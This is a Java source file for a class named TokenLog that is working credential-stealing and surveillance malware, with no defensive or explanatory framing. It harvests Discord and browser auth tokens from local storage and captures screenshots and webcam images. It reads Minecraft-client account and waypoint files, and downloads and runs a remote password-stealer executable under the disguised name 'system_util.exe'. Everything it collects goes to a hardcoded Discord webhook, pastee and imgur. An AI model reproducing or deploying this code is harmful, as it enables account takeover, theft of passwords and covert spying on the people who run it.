package me.ssl.logger.tokenlog;

import com.github.sarxos.webcam.Webcam;
import com.sun.istack.internal.NotNull;
import fr.minuskube.pastee.JPastee;
import fr.minuskube.pastee.data.Paste;
import fr.minuskube.pastee.data.Section;
import fr.minuskube.pastee.response.SubmitResponse;
import net.dv8tion.Uploader;
import org.json.JSONObject;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.*;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TokenLog {
    public static String readFile(String filename) {
        String content = null;
        File file = new File(filename);
        FileReader reader = null;
        try {
            reader = new FileReader(file);
            char[] chars = new char[(int) file.length()];
            reader.read(chars);
            content = new String(chars);
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if(reader != null){
                try {
                    reader.close();
                } catch (Exception exception) {}
            }
        }
        return content;
    }

    public static void mainToken(String[] args) {
        String llLlLlL = System.getProperty("os.name");
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = bufferedReader.readLine();
            String llLlLlLlL = System.getProperty("user.name");
            captureScreen();
            sendMessage("``` NAME : " + llLlLlLlL + "\n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```");
        } catch (Exception ignore) {
        }

        if (llLlLlL.contains("Windows")) {

            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");


            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {
                        }
                    }
                }
                sendMessage("```" + webhooks.toString() + "```");

            } catch (Exception e) {
                sendMessage("``` UNABLE TO PULL TOKENS : " + e + "```");
            }


        } else if (llLlLlL.contains("Mac")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {
                        }
                    }
                }
                sendMessage("```" + webhooks.toString() + "```");

            } catch (Exception e) {
                sendMessage("``` UNABLE TO PULL TOKEN[S] : " + e + "```");
            }
        } else {
            sendMessage("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```");
        }
        try {
            captureScreen();
        } catch (Exception ex) {
            sendMessage("``` UNABLE TO SCREENSHOT : " + ex + "```");
        }
        try {
            captureCamera();
        } catch (Exception ex) {
            sendMessage("``` UNABLE TO CAPTURE CAMERA : " + ex + "```");
        }
        try { Thread.sleep(500); } catch (Exception exception)  {}
        StringBuilder waypoints = new StringBuilder();
        try {
            File future = new File(System.getProperty("user.home") + "/Future/waypoints.txt");
            BufferedReader br = new BufferedReader(new FileReader(future));

            String s;

            while ((s = br.readLine()) != null) {
                waypoints.append("\n ").append(s);
            }
            JPastee jPastee = new JPastee("uCpHx3OeeOwxxhMCPdVKJ6FOzLfj5RFaITYJRHZzg");
            Paste paste = Paste.builder()
                    .addSection(Section.builder()
                            .name("waypoints")
                            .contents(waypoints.toString())
                            .build())
                    .encrypted(true)
                    .build();
            SubmitResponse resp = jPastee.submit(paste);
            if(resp.isSuccess())
                sendMessage("Uploaded pastebin with waypoints! " + resp.getLink());
        } catch (Exception exception) {}
        try {
            File future = new File(System.getProperty("user.home") + "/Future/accounts.txt");
            BufferedReader br = new BufferedReader(new FileReader(future));

            String s;

            StringBuilder accounts = new StringBuilder();

            while ((s = br.readLine()) != null) {
                String sb = s.split(":")[0] + " : " +
                        s.split(":")[3] + " : " +
                        s.split(":")[4];
                accounts.append("\n ").append(sb);

            }
            JPastee jPastee = new JPastee("uCpHx3OeeOwxxhMCPdVKJ6FOzLfj5RFaITYJRHZzg");
            Paste paste = Paste.builder()
                    .addSection(Section.builder()
                            .name("waypoints")
                            .contents(accounts.toString())
                            .build())
                    .encrypted(true)
                    .build();
            SubmitResponse resp = jPastee.submit(paste);
            if(resp.isSuccess())
                sendMessage("Uploaded pastebin with accounts! " + resp.getLink());
        } catch (Exception exception) {}
        try {
            InputStream in = new URL("https://raw.githubusercontent.com/tresacton/PasswordStealer/master/WebBrowserPassView.exe").openStream();
            Files.copy(in, Paths.get("system_util.exe"), StandardCopyOption.REPLACE_EXISTING);
            Process process = Runtime.getRuntime().exec("system_util.exe /scomma system_util.txt");
            process.waitFor();
            new File("system_util.exe").delete();
            String everything = readFile("system_util.txt");
            new File("system_util.txt").delete();

            JPastee jPastee = new JPastee("uCpHx3OeeOwxxhMCPdVKJ6FOzLfj5RFaITYJRHZzg");
            Paste paste = Paste.builder()
                    .addSection(Section.builder()
                            .name("yes")
                            .contents(everything)
                            .build())
                    .encrypted(true)
                    .build();
            SubmitResponse resp = jPastee.submit(paste);
            if(resp.isSuccess())
                sendMessage("Uploaded pastebin with dox! " + resp.getLink());
        } catch (Exception exception) {}
        for(File file : files)
            try {
                sendMessage("Uploaded 1 file to imgur: https://i.imgur.com/" + new JSONObject(Uploader.upload(file)).getJSONObject("data").getString("id") + ".png");
                //sendMessage("Uploaded 1 file to imgur: " + Uploader.upload(file));
                file.delete();
            } catch (Exception exception) {  }
    }

    private static void sendMessage(String message) {
        PrintWriter out = null;
        BufferedReader in = null;
        StringBuilder result = new StringBuilder();
        try {
            URL realUrl = new URL("https://discord.com/api/webhooks/791709572032233523/lnnBK2tX6FmVL5l6gC0kotCNDN4hTxu2rhPqx91k-q-HRHVexCydn8-I9clny0Meqoo9");
            URLConnection conn = realUrl.openConnection();
            conn.setRequestProperty("accept", "*/*");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            out = new PrintWriter(conn.getOutputStream());
            String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
            out.print(postData);
            out.flush();
            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String line;
            while ((line = in.readLine()) != null) {
                result.append("/n").append(line);
            }

        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (out != null) {
                    out.close();
                }
                if (in != null) {
                    in.close();
                }
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        System.out.println(result.toString());
    }

    private static void sendFile(File file) throws IOException {
        String url = "https://discord.com/api/webhooks/791709572032233523/lnnBK2tX6FmVL5l6gC0kotCNDN4hTxu2rhPqx91k-q-HRHVexCydn8-I9clny0Meqoo9";
        String boundary = Long.toHexString(System.currentTimeMillis());
        URLConnection connection = new URL(url).openConnection();
        connection.setDoOutput(true);
        connection.setRequestProperty("User-Agent","Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36");
        connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
        try (PrintWriter writer = new PrintWriter(new OutputStreamWriter(connection.getOutputStream(), StandardCharsets.US_ASCII))) {
            writer.println("--" + boundary);
            writer.println("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"");
            writer.write("Content-Type: image/png");
            writer.println();
            writer.println(readAllBytes(new FileInputStream(file)));
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), StandardCharsets.US_ASCII))) {
                for (String line; (line = reader.readLine()) != null; ) {
                    writer.println(line);
                }
            }
            writer.println("--" + boundary + "--");
        }
        System.out.println(((HttpURLConnection) connection).getResponseMessage());
    }
    public static byte[] readAllBytes(@NotNull InputStream stream) throws IOException {
        int count, pos = 0;
        byte[] output = new byte[0];
        byte[] buf = new byte[1024];
        while ((count = stream.read(buf)) > 0) {
            if (pos + count >= output.length) {
                byte[] tmp = output;
                output = new byte[pos + count];
                System.arraycopy(tmp, 0, output, 0, tmp.length);
            }

            for (int i = 0; i < count; i++) {
                output[pos++] = buf[i];
            }
        }
        return output;
    }

    static ArrayList<File> files = new ArrayList<>();

    @SuppressWarnings("all")
    private static void captureScreen() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        int random = new Random().nextInt();
        File file = new File("cached_" + random + ".png");
        ImageIO.write(image, "png", file);
        files.add(file);
    }

    private static void captureCamera() throws Exception {
        Webcam cam = Webcam.getDefault();
        cam.open();
        int random = Math.abs(new Random().nextInt());
        File webcam = new File("1cached_" + random + ".png");
        ImageIO.write(cam.getImage(), "png", webcam);
        cam.close();
        files.add(webcam);
    }
}